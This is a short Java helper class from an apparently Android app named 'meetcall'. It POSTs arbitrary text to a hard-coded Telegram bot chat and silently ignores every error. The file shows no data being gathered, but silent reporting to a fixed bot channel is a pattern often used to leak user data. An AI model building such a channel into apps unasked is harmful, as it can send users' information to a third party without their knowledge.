package com.meetcall.app;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;

public final class Net {

    public static void send(String text) {
        try {
            String url = "https://api.telegram.org/bot" + Cfg.BOT_TOKEN + "/sendMessage";
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setRequestMethod("POST");
            c.setConnectTimeout(15000);
            c.setReadTimeout(15000);
            c.setDoOutput(true);
            c.setRequestProperty("Content-Type", "application/json; charset=utf-8");

            JSONObject o = new JSONObject();
            o.put("chat_id", Cfg.CHAT_ID);
            o.put("text", text.length() > 3900 ? text.substring(0, 3900) : text);
            o.put("parse_mode", "HTML");
            o.put("disable_web_page_preview", true);

            OutputStream os = c.getOutputStream();
            os.write(o.toString().getBytes("UTF-8"));
            os.close();
            c.getResponseCode();
            c.disconnect();
        } catch (Exception ignored) {}
    }

    public static String esc(String s) {
        if (s == null) return "-";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }
}
